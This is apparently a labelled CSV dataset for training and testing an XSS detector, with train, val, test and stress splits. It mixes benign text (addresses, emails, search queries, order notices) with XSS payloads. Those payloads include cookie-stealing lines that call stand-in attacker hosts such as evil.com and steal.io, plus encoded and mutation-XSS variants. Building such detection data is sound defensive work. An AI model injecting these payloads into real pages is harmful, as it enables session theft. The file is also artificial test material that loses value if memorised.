@@ -1,0 +1,1810 @@
+text,label,category,family,split
+Why does fetch return a promise? Asking about football code.,0,code_talk,benign_stress,stress
+"House no. 130, Sector 43, Ghaziabad",0,address,benign,train
+<scr<script>ipt>confirm(1)</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,train
+notebook comparison,0,search,benign,train
+Please contact chen.verma59@company.com for help.,0,email,benign,val
+"<img src=x onerror=""document.location='http://bad.site/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+"Support was amazing, resolved my issue in 7 minutes.",0,feedback,benign,val
+<scr<script>ipt>prompt(1)</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,train
+/var/www/python/index.html,0,url_path,benign_stress,stress
+"<body onload=""fetch('http://h4ck.me/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,val
+<SCRIPT>alert(document.domain)</SCRIPT>,1,script_tag,script_tag,train
+"Support was amazing, resolved my issue in 28 minutes.",0,feedback,benign,train
+Refund of $118.85 processed for order 29525.,0,order,benign,train
+"<a href=""javascript:fetch('http://c2.example.org/?c='+document.cookie)"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+<img src=x onstart=alert(document.cookie)>,1,event_common,event_common,train
+Meeting at 10pm on 9 Mar,0,price_date,benign,train
+best notebook 2020,0,search,benign,train
+Dr. Liam Ali,0,name,benign,val
+`${alert(document.domain)}`,1,js_context,js_context,train
+Solve: 3x + 16 = 29,0,math,benign_stress,stress
+Product ID: 645940,0,product,benign,val
+/var/www/machine_learning/index.html,0,url_path,benign_stress,stress
+Kabir Taylor,0,name,benign,train
+%3Cscript%3Ealert(origin)%3C/script%3E,1,encoded,encoded,test
+<p ontransitionend=confirm(1)>x,1,rare_handler,rare_handler,stress
+Omar Gupta,0,name,benign,train
+Refund of $152.30 processed for order 65552.,0,order,benign,test
+Arjun Taylor-Joshi,0,name,benign,test
+<svg/onmouseover=alert('XSS')>,1,event_common,event_common,test
+"<p>Hi team, the running shoes arrived.</p>",0,html_formatting,benign_stress,stress
+Meeting at 5am on 11 Jan,0,price_date,benign,val
+excellent water bottle under 253 dollars,0,search,benign,val
+<i>Emma</i> said the notebook is amazing.,0,html_formatting,benign_stress,stress
+useful notebook under 419 dollars,0,search,benign,val
+"<a href=""javascript:fetch('http://attacker.net/?c='+document.cookie)"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+Refund of $156.70 processed for order 47988.,0,order,benign,train
+"<iframe srcdoc=""<script>alert(document.domain)</script>""></iframe>",1,frame_object,frame_object,test
+<body onload=console.log(1)><!-- 18610 -->,1,mixed_obfuscated,mixed_obfuscated,test
+<body onload=alert('XSS')><!-- 43205 -->,1,mixed_obfuscated,mixed_obfuscated,train
+Nice work Noah! The part about networking helped me a lot.,0,comment,benign,val
+"<body onload=""new Image().src='http://steal.io/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+"633 MG Road, Pune",0,address,benign,train
+"1 Park Avenue, Austin",0,address,benign,train
+priya.wilson67@gmail.com,0,email,benign,test
+"<iframe src=""data:text/html,<b>17301</b>""></iframe>",1,data_uri,data_uri,stress
+Category: Electronics & Garden,0,product,benign,train
+Price range: $119 - $896,0,price_date,benign,train
+decent notebook under 70 dollars,0,search,benign,train
+"<iframe src=""javascript:alert(String.fromCharCode(88,83,83))""></iframe>",1,js_uri,js_uri,test
+"<form action=""javascript:alert(1)""><input type=submit>",1,js_uri,js_uri,train
+amazing running shoes under 103 dollars,0,search,benign,train
+Why does fetch return a promise? Asking about databases code.,0,code_talk,benign_stress,stress
+"<a href=""javascript:document.location='http://x.example/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+Nice work Arjun! The part about football helped me a lot.,0,comment,benign,train
+"Notebook - great quality, ships in 1 days",0,product,benign,train
+"12 Park Avenue, Noida",0,address,benign,train
+Nice work Meera! The part about networking helped me a lot.,0,comment,benign,train
+<svg/onload=alert(origin)>,1,event_common,event_common,train
+Meeting at 6pm on 23 Oct,0,price_date,benign,train
+This was amazing. Looking forward to more on databases.,0,comment,benign,train
+<svg/onfocus=console.log(1)>,1,event_common,event_common,val
+"""-confirm(1)-""",1,js_context,js_context,train
+<span onanimationstart=alert(document.cookie)>x,1,rare_handler,rare_handler,stress
+best laptop 2021,0,search,benign,train
+"Age: 25, Location: Berlin",0,price_date,benign,val
+""";alert(document.cookie)//",1,js_context,js_context,train
+"<meta http-equiv=""refresh"" content=""0;url=data:text/html,<script>prompt(1)</script>"">",1,mutation_xss,mutation_xss,stress
+f(x) = x^2 + 4x - 7; f(1) = ?,0,math,benign_stress,stress
+"<iframe src=""data:text/html,<b>3400</b>""></iframe>",1,data_uri,data_uri,stress
+x=document.cookie;alert('XSS');//10529,1,js_context_long,js_context_long,stress
+"House no. 203, Sector 41, Pune",0,address,benign,train
+Reply to priya.joshi28@mail.example by Friday.,0,email,benign,train
+"<object data=""http://c2.example.org/x.swf""></object>",1,frame_object,frame_object,test
+"Office Chair - solid quality, ships in 1 days",0,product,benign,train
+Why does fetch return a promise? Asking about travel code.,0,code_talk,benign_stress,stress
+"<iframe src=""data:text/html,<b>54281</b>""></iframe>",1,data_uri,data_uri,stress
+Nice work Neha! The part about web security helped me a lot. Nice work Kabir! The part about music helped me a lot. I honestly liked this post on photography.,0,long_paragraph,benign_stress,stress
+"Flat 27D, Station Road, Ghaziabad 186686",0,address,benign,train
+Order #58867 confirmed.,0,order,benign,val
+');confirm(1)</script>,1,js_context,js_context,train
+"Keyboard - excellent quality, ships in 2 days",0,product,benign,val
+Refund of $161.30 processed for order 70199.,0,order,benign,val
+`${confirm(1)}`,1,js_context,js_context,train
+Can you write a follow-up on music? Thanks.,0,comment,benign,train
+how to learn travel fast,0,search,benign,test
+Product ID: 478458,0,product,benign,test
+<body onload=alert(document.domain)><!-- 55824 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"Flat 33A, Main Street, Delhi 356430",0,address,benign,train
+average backpack under 71 dollars,0,search,benign,train
+"""onmouseover=""alert(origin)"" x=""",1,js_context_long,js_context_long,stress
+<img src=x onstart=alert(document.domain)>,1,event_common,event_common,train
+Refund of $65.77 processed for order 22541.,0,order,benign,val
+Your order of 1 x water bottle was shipped on 28/12/2026.,0,order,benign,val
+"Flat 27B, Lake View, Delhi 981639",0,address,benign,train
+');alert(document.domain)</script>,1,js_context,js_context,train
+amazing water bottle under 466 dollars,0,search,benign,train
+Refund of $212.33 processed for order 58551.,0,order,benign,val
+Rating 3/5 - decent experience overall.,0,feedback,benign,train
+Dr. David Smith,0,name,benign,val
+Refund of $272.53 processed for order 32571.,0,order,benign,train
+"House no. 188, Sector 35, Delhi",0,address,benign,train
+C:\Users\Amit\Documents\running_shoes.txt,0,url_path,benign_stress,stress
+"<meta http-equiv=""refresh"" content=""0;url=data:text/html,<script>confirm(1)</script>"">",1,mutation_xss,mutation_xss,stress
+"<img src=x onerror=""document.location='http://x.example/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+Dr. Anita Kumar,0,name,benign,train
+"<iframe src=""data:text/html,<b>8761</b>""></iframe>",1,data_uri,data_uri,stress
+"Support was excellent, resolved my issue in 8 minutes.",0,feedback,benign,train
+rahul.mehta76@outlook.com,0,email,benign,train
+"Office Chair - decent quality, ships in 6 days",0,product,benign,test
+Order #65823 confirmed.,0,order,benign,train
+Product ID: 164401,0,product,benign,train
+Order #13266 confirmed.,0,order,benign,val
+Order #14855 confirmed.,0,order,benign,train
+Reply to liam.singh52@mail.example by Friday.,0,email,benign,train
+"Laptop - amazing quality, ships in 2 days",0,product,benign,train
+<svg	onload	=	alert(origin)>,1,case_whitespace,case_whitespace,stress
+Dr. Fatima Taylor,0,name,benign,train
+"Great article about machine learning, thanks for sharing! Nice work John! The part about photography helped me a lot. I really liked this post on web security.",0,long_paragraph,benign_stress,stress
+Product ID: 561859,0,product,benign,train
+"Support was reliable, resolved my issue in 1 minutes.",0,feedback,benign,test
+Order #93747 confirmed.,0,order,benign,train
+"""onmouseover=""console.log(1)"" x=""",1,js_context_long,js_context_long,stress
+<svg/onerror=alert('XSS')>,1,event_common,event_common,train
+SELECT name FROM users WHERE id = 91;,0,structured,benign_stress,stress
+if x < 8 and y > 5 then z = x + y,0,math,benign_stress,stress
+"<object data=""http://evil.com/x.swf""></object>",1,frame_object,frame_object,test
+"Support was excellent, resolved my issue in 26 minutes.",0,feedback,benign,train
+decent keyboard under 471 dollars,0,search,benign,test
+Dr. David Verma,0,name,benign,train
+Refund of $188.72 processed for order 21123.,0,order,benign,test
+david.garcia14@college.edu,0,email,benign,train
+anita.patel69@college.edu,0,email,benign,train
+6 < 20 && 31 > 8,0,math,benign_stress,stress
+SKU-7776-DY,0,product,benign,test
+<script>new Image().src='http://attacker.net/?c='+document.cookie</script>,1,script_tag,script_tag,train
+"Flat 37A, Mall Road, Pune 661652",0,address,benign,train
+Amit Mehta,0,name,benign,train
+Maria Wang,0,name,benign,train
+<img src=x onload=alert(1)>,1,event_common,event_common,train
+<body onload=alert(document.domain)><!-- 8112 -->,1,mixed_obfuscated,mixed_obfuscated,train
+Nice work Anita! The part about cricket helped me a lot.,0,comment,benign,train
+"<a href=""javascript:fetch('http://bad.site/?c='+document.cookie)"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+Order #74711 confirmed.,0,order,benign,train
+Meeting at 2pm on 23 Jan,0,price_date,benign,train
+"136 Station Road, Mumbai",0,address,benign,val
+decent coffee maker under 44 dollars,0,search,benign,train
+Price range: $40 - $728,0,price_date,benign,train
+<body onload=alert(origin)><!-- 23324 -->,1,mixed_obfuscated,mixed_obfuscated,train
+Product ID: 481104,0,product,benign,test
+Reply to david.wang86@mail.example by Friday.,0,email,benign,train
+"Flat 40B, Hill Crest, Pune 623125",0,address,benign,train
+"<noscript><p title=""</noscript><img src=x onerror=alert(document.cookie)>"">",1,mutation_xss,mutation_xss,stress
+Reply to zara.clark40@mail.example by Friday.,0,email,benign,train
+I honestly liked this post on football.,0,comment,benign,train
+"Support was amazing, resolved my issue in 21 minutes.",0,feedback,benign,train
+Your order of 1 x water bottle was shipped on 22/9/2026.,0,order,benign,test
+Order #20508 confirmed.,0,order,benign,test
+I honestly liked this post on travel.,0,comment,benign,train
+"""Anita said: 'it's great!'""",0,structured,benign_stress,stress
+Nice work Fatima! The part about web security helped me a lot.,0,comment,benign,train
+"<iframe src=""data:text/html,<b>51042</b>""></iframe>",1,data_uri,data_uri,stress
+Reply to arjun.clark63@mail.example by Friday.,0,email,benign,val
+Price range: $112 - $714,0,price_date,benign,val
+notebook deals,0,search,benign,val
+%3cscript%3econsole.log(1)%3c%2fscript%3e,1,encoded,encoded,train
+<body onload=console.log(1)><!-- 41871 -->,1,mixed_obfuscated,mixed_obfuscated,val
+Price range: $55 - $584,0,price_date,benign,train
+"<a href=""javascript:fetch('http://evil.com/?c='+document.cookie)"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+Please contact noah.sharma60@company.com for help.,0,email,benign,val
+"Flat 35B, MG Road, Delhi 529954",0,address,benign,train
+SKU-1013-FZ,0,product,benign,test
+Can you write a follow-up on python? Thanks.,0,comment,benign,test
+<script>document.write('<img src=http://c2.example.org/?c='+document.cookie+'>')</script>,1,exfil_dom,exfil_dom,test
+"808 Mall Road, Austin",0,address,benign,test
+<svg/onstart=alert(document.domain)>,1,event_common,event_common,test
+best water bottle 2020,0,search,benign,train
+Your order of 2 x headphones was shipped on 1/4/2026.,0,order,benign,train
+<script >prompt(1)</script >,1,script_tag,script_tag,train
+');console.log(1);//,1,js_context,js_context,test
+<script>alert(document.domain)</script>,1,script_tag,script_tag,train
+<select onclick=confirm(1)>hover,1,rare_handler,rare_handler,stress
+Refund of $263.14 processed for order 65797.,0,order,benign,train
+Feedback: Average service and quick delivery.,0,feedback,benign,train
+"Great article about cooking, thanks for sharing!",0,comment,benign,train
+"Great article about football, thanks for sharing! Can you write a follow-up on databases? Thanks. Can you write a follow-up on cooking? Thanks. I really liked this post on football.",0,long_paragraph,benign_stress,stress
+Rating 2/5 - useful experience overall.,0,feedback,benign,val
+<body onload=alert(document.cookie)><!-- 97708 -->,1,mixed_obfuscated,mixed_obfuscated,train
+running shoes comparison,0,search,benign,train
+how to learn cooking fast,0,search,benign,test
+<body onload=alert(document.cookie)><!-- 54867 -->,1,mixed_obfuscated,mixed_obfuscated,test
+&#60;script&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#111;&#114;,1,encoded,encoded,val
+"<iframe src=""data:text/html,<b>71640</b>""></iframe>",1,data_uri,data_uri,stress
+Nice work Neha! The part about music helped me a lot.,0,comment,benign,test
+<svg/onmouseover=confirm(1)>,1,event_common,event_common,test
+</script><svg/onload=alert(document.cookie)>,1,js_context_long,js_context_long,stress
+best office chair 2024,0,search,benign,val
+"<svg ontoggle=""alert(document.cookie)"">",1,event_common,event_common,test
+"Phone Case - great quality, ships in 7 days",0,product,benign,train
+"<a href=""https://example.com/music"">read more</a>",0,html_formatting,benign_stress,stress
+Priya Clark-Patel,0,name,benign,train
+Price range: $145 - $701,0,price_date,benign,train
+SELECT name FROM users WHERE id = 415;,0,structured,benign_stress,stress
+<div onfocusin=alert(document.domain)>x,1,rare_handler,rare_handler,stress
+"Support was amazing, resolved my issue in 22 minutes.",0,feedback,benign,train
+"<iframe src=""data:text/html,<b>59055</b>""></iframe>",1,data_uri,data_uri,stress
+Category: Books & Outdoors,0,product,benign,train
+<script>document.write('<img src=http://evil.com/?c='+document.cookie+'>')</script>,1,exfil_dom,exfil_dom,test
+SKU-9283-AY,0,product,benign,train
+Meeting at 5pm on 7 Jan,0,price_date,benign,train
+I honestly liked this post on web security.,0,comment,benign,train
+Rating 1/5 - disappointing experience overall.,0,feedback,benign,train
+<a href=# ondblclick=alert(origin)>hover,1,rare_handler,rare_handler,stress
+<script >alert('XSS')</script >,1,script_tag,script_tag,val
+<script >alert(origin)</script >,1,script_tag,script_tag,test
+liam.smith61@company.in,0,email,benign,train
+Price range: $198 - $254,0,price_date,benign,train
+Reply to liam.khan9@mail.example by Friday.,0,email,benign,train
+Liam Reddy-Wilson,0,name,benign,train
+"<iframe srcdoc=""<script>alert(document.cookie)</script>""></iframe>",1,frame_object,frame_object,train
+Meeting at 7pm on 10 Jun,0,price_date,benign,train
+how to learn music fast,0,search,benign,train
+I really liked this post on photography.,0,comment,benign,val
+"Flat 30C, Mall Road, Mumbai 934328",0,address,benign,val
+Refund of $122.21 processed for order 63961.,0,order,benign,train
+Why does fetch return a promise? Asking about cooking code.,0,code_talk,benign_stress,stress
+&#60;script&#62;&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;,1,encoded,encoded,test
+Arjun Verma-Khan,0,name,benign,train
+<details open onerror=alert(document.cookie)>,1,event_common,event_common,train
+"<a href=""https://example.com/networking"">read more</a>",0,html_formatting,benign_stress,stress
+<span onanimationstart=alert(origin)>x,1,rare_handler,rare_handler,stress
+Nice work Meera! The part about python helped me a lot.,0,comment,benign,train
+<SCRIPT>alert(origin)</SCRIPT>,1,script_tag,script_tag,train
+how to learn football fast,0,search,benign,train
+';alert(document.domain)//,1,js_context,js_context,train
+"Tip: avoid eval in your code, use JSON.parse for databases data.",0,code_talk,benign_stress,stress
+"Headphones - useful quality, ships in 4 days",0,product,benign,test
+"Support was excellent, resolved my issue in 23 minutes.",0,feedback,benign,test
+<svg/onfocus=alert(document.cookie)>,1,event_common,event_common,train
+"<iframe src=""data:text/html,<b>92634</b>""></iframe>",1,data_uri,data_uri,stress
+"Age: 22, Location: Pune",0,price_date,benign,test
+Dr. Anita Gupta,0,name,benign,test
+<IMG SRC=x ONERROR=CONSOLE.LOG(1)>,1,case_whitespace,case_whitespace,stress
+Meeting at 1pm on 24 Jan,0,price_date,benign,val
+"Flat 40B, Hill Crest, Austin 209167",0,address,benign,val
+Meeting at 4pm on 19 Mar,0,price_date,benign,test
+"Running Shoes - disappointing quality, ships in 2 days",0,product,benign,val
+best backpack 2026,0,search,benign,train
+chen.gupta9@college.edu,0,email,benign,train
+<body onload=alert(1)><!-- 63800 -->,1,mixed_obfuscated,mixed_obfuscated,test
+"<noscript><p title=""</noscript><img src=x onerror=alert(document.domain)>"">",1,mutation_xss,mutation_xss,stress
+"<input autofocus onstart=""alert(String.fromCharCode(88,83,83))"">",1,event_common,event_common,train
+%3Cscript%3Ealert(1)%3C/script%3E,1,encoded,encoded,test
+"<div ondblclick=alert(String.fromCharCode(88,83,83))>click",1,rare_handler,rare_handler,stress
+"<input autofocus onerror=""alert(document.domain)"">",1,event_common,event_common,train
+<body onload=confirm(1)><!-- 56538 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"<b>Excellent</b> post, thanks Meera!",0,html_formatting,benign_stress,stress
+"Flat 3D, Park Avenue, Noida 151685",0,address,benign,train
+"<img src=x onerror=""new Image().src='http://steal.io/?c='+document.cookie"">",1,exfil_dom,exfil_dom,val
+<script src=http://x.example/x.js></script>,1,script_tag,script_tag,train
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>,1,mutation_xss,mutation_xss,stress
+I quite liked this post on gardening.,0,comment,benign,val
+disappointing headphones under 495 dollars,0,search,benign,train
+Your order of 2 x water bottle was shipped on 2/4/2026.,0,order,benign,train
+Why does fetch return a promise? Asking about photography code.,0,code_talk,benign_stress,stress
+<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>,1,mutation_xss,mutation_xss,stress
+"<object data=""http://x.example/x.swf""></object>",1,frame_object,frame_object,train
+<body onload=alert(document.cookie)><!-- 13299 -->,1,mixed_obfuscated,mixed_obfuscated,val
+"<audio src=x onload=""alert(origin)"">",1,event_common,event_common,val
+"Flat 3A, Main Street, Noida 730889",0,address,benign,train
+"Age: 43, Location: Sydney",0,price_date,benign,train
+zara.smith97@company.in,0,email,benign,test
+""";confirm(1)//",1,js_context,js_context,train
+<iframe src=http://x.example/p.html></iframe>,1,frame_object,frame_object,train
+');alert('XSS')</script>,1,js_context,js_context,val
+<body onload=alert(document.cookie)><!-- 79815 -->,1,mixed_obfuscated,mixed_obfuscated,train
+SKU-6681-FY,0,product,benign,train
+Order #55068 confirmed.,0,order,benign,test
+"<body onload=""document.location='http://h4ck.me/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+%3cscript%3ealert(origin)%3c%2fscript%3e,1,encoded,encoded,train
+Meeting at 6am on 11 Mar,0,price_date,benign,train
+"Support was solid, resolved my issue in 1 minutes.",0,feedback,benign,train
+"882 Mall Road, Austin",0,address,benign,train
+"<video src=x onstart=""console.log(1)"">",1,event_common,event_common,train
+"Flat 28A, Hill Crest, Noida 412170",0,address,benign,test
+Rating 5/5 - reliable experience overall.,0,feedback,benign,test
+Refund of $101.18 processed for order 72347.,0,order,benign,test
+Price range: $157 - $412,0,price_date,benign,val
+Reply to anita.singh22@mail.example by Friday.,0,email,benign,val
+<i>Maria</i> said the monitor is useful.,0,html_formatting,benign_stress,stress
+x=document.cookie;console.log(1);//47641,1,js_context_long,js_context_long,stress
+Nice work Fatima! The part about music helped me a lot.,0,comment,benign,train
+Your order of 4 x backpack was shipped on 24/11/2026.,0,order,benign,train
+"Flat 13D, Park Avenue, Delhi 921875",0,address,benign,val
+This was amazing. Looking forward to more on photography.,0,comment,benign,train
+SELECT name FROM users WHERE id = 305;,0,structured,benign_stress,stress
+"<scr<script>ipt>alert(String.fromCharCode(88,83,83))</scr</script>ipt>",1,mixed_obfuscated,mixed_obfuscated,test
+SKU-1133-EZ,0,product,benign,train
+<script>new Image().src='http://x.example/?c='+document.cookie</script>,1,script_tag,script_tag,train
+Product ID: 308376,0,product,benign,train
+I used the script tag in my page and the cooking demo worked.,0,code_talk,benign_stress,stress
+Product ID: 987938,0,product,benign,test
+&#60;script&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;,1,encoded,encoded,train
+<body onload=alert(origin)><!-- 39382 -->,1,mixed_obfuscated,mixed_obfuscated,train
+JaVaScRiPt:prompt(1),1,case_whitespace,case_whitespace,stress
+"""-alert(document.cookie)-""",1,js_context,js_context,train
+"Support was disappointing, resolved my issue in 28 minutes.",0,feedback,benign,train
+Your order of 1 x notebook was shipped on 3/7/2026.,0,order,benign,test
+C:\Users\Rahul\Documents\water_bottle.txt,0,url_path,benign_stress,stress
+"<img
+src=x
+OnErRoR=alert(String.fromCharCode(88,83,83))>",1,case_whitespace,case_whitespace,stress
+<body onload=alert(origin)><!-- 73511 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"<script type=""text/javascript"">alert(document.cookie)</script>",1,script_tag,script_tag,train
+SELECT name FROM users WHERE id = 993;,0,structured,benign_stress,stress
+Dr. Emma Wilson,0,name,benign,val
+"Age: 60, Location: Mumbai",0,price_date,benign,train
+"<audio src=x ontoggle=""console.log(1)"">",1,event_common,event_common,train
+<svg	onload	=	alert(document.cookie)>,1,case_whitespace,case_whitespace,stress
+average desk lamp under 394 dollars,0,search,benign,train
+<svg onload=alert(document.cookie)>,1,event_common,event_common,test
+<body onload=alert('XSS')><!-- 67919 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"Flat 3D, MG Road, London 360322",0,address,benign,train
+Arjun Verma-Patel,0,name,benign,val
+</script><svg/onload=alert(1)>,1,js_context_long,js_context_long,stress
+"835 Main Street, Ghaziabad",0,address,benign,train
+best running shoes 2022,0,search,benign,train
+"Age: 50, Location: Toronto",0,price_date,benign,test
+"<form action=""javascript:alert(String.fromCharCode(88,83,83))""><input type=submit>",1,js_uri,js_uri,train
+useful office chair under 343 dollars,0,search,benign,train
+reliable phone case under 112 dollars,0,search,benign,train
+"<form action=""javascript:alert(origin)""><input type=submit>",1,js_uri,js_uri,train
+"Age: 39, Location: London",0,price_date,benign,test
+"<iframe src=""data:text/html,<b>74827</b>""></iframe>",1,data_uri,data_uri,stress
+"<iframe src=""javascript:alert(origin)""></iframe>",1,js_uri,js_uri,train
+<input autofocus onfocus=alert(document.domain)>,1,event_common,event_common,train
+"468 Main Street, Berlin",0,address,benign,test
+"Laptop - reliable quality, ships in 7 days",0,product,benign,train
+"<script type=""text/javascript"">alert(origin)</script>",1,script_tag,script_tag,test
+best office chair 2023,0,search,benign,val
+<SCRIPT>console.log(1)</SCRIPT>,1,script_tag,script_tag,test
+best headphones 2020,0,search,benign,train
+"This was disappointing. Looking forward to more on football. Nice work Liam! The part about cricket helped me a lot. Great article about travel, thanks for sharing!",0,long_paragraph,benign_stress,stress
+Your order of 1 x notebook was shipped on 12/7/2026.,0,order,benign,train
+"`${alert(String.fromCharCode(88,83,83))}`",1,js_context,js_context,test
+I used the script tag in my page and the web security demo worked.,0,code_talk,benign_stress,stress
+"Support was great, resolved my issue in 23 minutes.",0,feedback,benign,train
+best phone case 2020,0,search,benign,train
+"<b>Great</b> post, thanks Anita!",0,html_formatting,benign_stress,stress
+David_Garcia59,0,name,benign,train
+Please contact david.clark63@company.com for help.,0,email,benign,test
+water bottle price,0,search,benign,train
+Order #95426 confirmed.,0,order,benign,val
+"House no. 70, Sector 11, Berlin",0,address,benign,train
+"<img
+src=x
+OnErRoR=alert(origin)>",1,case_whitespace,case_whitespace,stress
+<script >alert(document.domain)</script >,1,script_tag,script_tag,train
+keyboard deals,0,search,benign,test
+SELECT name FROM users WHERE id = 731;,0,structured,benign_stress,stress
+"<iframe src=""data:text/html,<b>6047</b>""></iframe>",1,data_uri,data_uri,stress
+Price range: $184 - $351,0,price_date,benign,train
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 73664 -->",1,mixed_obfuscated,mixed_obfuscated,train
+amit.gupta27@outlook.com,0,email,benign,train
+"<iframe src=""data:text/html,<b>74626</b>""></iframe>",1,data_uri,data_uri,stress
+"<iframe src=""data:text/html,<b>63260</b>""></iframe>",1,data_uri,data_uri,stress
+"<math><mtext><table><mglyph><style><!--</style><img title=""--&gt;&lt;img src=1 onerror=alert(document.domain)&gt;"">",1,mutation_xss,mutation_xss,stress
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 72242 -->",1,mixed_obfuscated,mixed_obfuscated,train
+Fatima Sharma,0,name,benign,test
+Meeting at 6pm on 22 Oct,0,price_date,benign,test
+SKU-9704-FY,0,product,benign,test
+\';alert(document.domain)//,1,js_context,js_context,train
+monitor comparison,0,search,benign,val
+Rating 2/5 - average experience overall.,0,feedback,benign,val
+solid headphones under 367 dollars,0,search,benign,train
+<SCRIPT>prompt(1)</SCRIPT>,1,script_tag,script_tag,train
+"<a href=""javascript:new Image().src='http://evil.com/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+Sofia Sharma-Wilson,0,name,benign,train
+This was decent. Looking forward to more on gardening.,0,comment,benign,train
+"716 Station Road, Noida",0,address,benign,train
+<body onload=alert(1)><!-- 45002 -->,1,mixed_obfuscated,mixed_obfuscated,val
+"<body onfocus=""alert(String.fromCharCode(88,83,83))"">",1,event_common,event_common,train
+Reply to maria.taylor30@mail.example by Friday.,0,email,benign,train
+great backpack under 445 dollars,0,search,benign,val
+"<script type=""text/javascript"">alert(String.fromCharCode(88,83,83))</script>",1,script_tag,script_tag,train
+Rating 4/5 - excellent experience overall.,0,feedback,benign,test
+Refund of $192.32 processed for order 94957.,0,order,benign,test
+"Support was useful, resolved my issue in 29 minutes.",0,feedback,benign,train
+best coffee maker 2026,0,search,benign,test
+John_Gupta32,0,name,benign,val
+"<a href=""javascript:fetch('http://x.example/?c='+document.cookie)"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+<ul><li>notebook</li><li>desk lamp</li></ul>,0,html_formatting,benign_stress,stress
+Product ID: 286906,0,product,benign,test
+<audio src=x onstart=alert(document.cookie)>,1,event_common,event_common,test
+SKU-9787-AX,0,product,benign,test
+Refund of $63.73 processed for order 87984.,0,order,benign,train
+<p oncopy=alert(origin)>hover,1,rare_handler,rare_handler,stress
+Meeting at 8am on 17 Oct,0,price_date,benign,test
+<body onload=alert(1)><!-- 95261 -->,1,mixed_obfuscated,mixed_obfuscated,train
+Order #48307 confirmed.,0,order,benign,val
+if x < 8 and y > 3 then z = x + y,0,math,benign_stress,stress
+<body onload=alert('XSS')><!-- 42556 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"Flat 13D, Hill Crest, Sydney 857111",0,address,benign,train
+Can you write a follow-up on databases? Thanks.,0,comment,benign,test
+Price range: $163 - $385,0,price_date,benign,test
+best backpack 2023,0,search,benign,train
+Reply to sofia.khan1@mail.example by Friday.,0,email,benign,train
+I really liked this post on machine learning.,0,comment,benign,test
+This was solid. Looking forward to more on web security.,0,comment,benign,train
+"Flat 37C, Hill Crest, Austin 354367",0,address,benign,val
+<body onload=alert(document.domain)><!-- 61986 -->,1,mixed_obfuscated,mixed_obfuscated,val
+desk lamp deals,0,search,benign,test
+This was useful. Looking forward to more on music.,0,comment,benign,train
+amit.wilson4@gmail.com,0,email,benign,val
+This was reliable. Looking forward to more on photography.,0,comment,benign,test
+<body onload=console.log(1)><!-- 74078 -->,1,mixed_obfuscated,mixed_obfuscated,val
+"""onmouseover=""prompt(1)"" x=""",1,js_context_long,js_context_long,stress
+"Support was decent, resolved my issue in 1 minutes.",0,feedback,benign,train
+<input autofocus onstart=alert(1)>,1,event_common,event_common,train
+Your order of 2 x phone case was shipped on 20/2/2026.,0,order,benign,val
+Product ID: 457264,0,product,benign,train
+"Support was great, resolved my issue in 6 minutes.",0,feedback,benign,train
+"<meta http-equiv=""refresh"" content=""0;url=data:text/html,<script>console.log(1)</script>"">",1,mutation_xss,mutation_xss,stress
+Nice work Fatima! The part about photography helped me a lot. Can you write a follow-up on football? Thanks. This was solid. Looking forward to more on databases. Nice work Meera! The part about cooking helped me a lot. Can you write a follow-up on cricket? Thanks.,0,long_paragraph,benign_stress,stress
+Dr. John Joshi,0,name,benign,val
+"Notebook - useful quality, ships in 2 days",0,product,benign,train
+"Support was reliable, resolved my issue in 18 minutes.",0,feedback,benign,val
+laptop deals,0,search,benign,test
+Price range: $121 - $589,0,price_date,benign,test
+"<embed src=""http://c2.example.org/x.svg"">",1,frame_object,frame_object,train
+Rating 2/5 - disappointing experience overall.,0,feedback,benign,test
+Meeting at 5am on 10 Jan,0,price_date,benign,val
+Price range: $56 - $594,0,price_date,benign,val
+<body onload=alert(1)><!-- 31467 -->,1,mixed_obfuscated,mixed_obfuscated,test
+"Can you write a follow-up on machine learning? Thanks. I quite liked this post on cricket. I really liked this post on databases. Great article about machine learning, thanks for sharing!",0,long_paragraph,benign_stress,stress
+"<img src=x onerror=""document.location='http://evil.com/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+"<iframe src=""data:text/html,<b>50582</b>""></iframe>",1,data_uri,data_uri,stress
+"<embed src=""http://evil.com/x.svg"">",1,frame_object,frame_object,train
+x=document.cookie;alert(document.domain);//25592,1,js_context_long,js_context_long,stress
+"Support was great, resolved my issue in 17 minutes.",0,feedback,benign,train
+');alert(origin);//,1,js_context,js_context,val
+Feedback: Useful service and quick delivery.,0,feedback,benign,train
+reliable backpack under 274 dollars,0,search,benign,train
+"<iframe src=""data:text/html,<b>17500</b>""></iframe>",1,data_uri,data_uri,stress
+`${alert(1)}`,1,js_context,js_context,test
+sneha.garcia93@outlook.com,0,email,benign,train
+Meeting at 12pm on 2 Mar,0,price_date,benign,val
+"Great article about machine learning, thanks for sharing! This was disappointing. Looking forward to more on databases. Great article about travel, thanks for sharing! This was great. Looking forward to more on cooking.",0,long_paragraph,benign_stress,stress
+SKU-7366-FY,0,product,benign,train
+"146 Park Avenue, Pune",0,address,benign,test
+"House no. 59, Sector 17, Toronto",0,address,benign,test
+Rating 4/5 - great experience overall.,0,feedback,benign,val
+"<a href=""javascript:new Image().src='http://c2.example.org/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
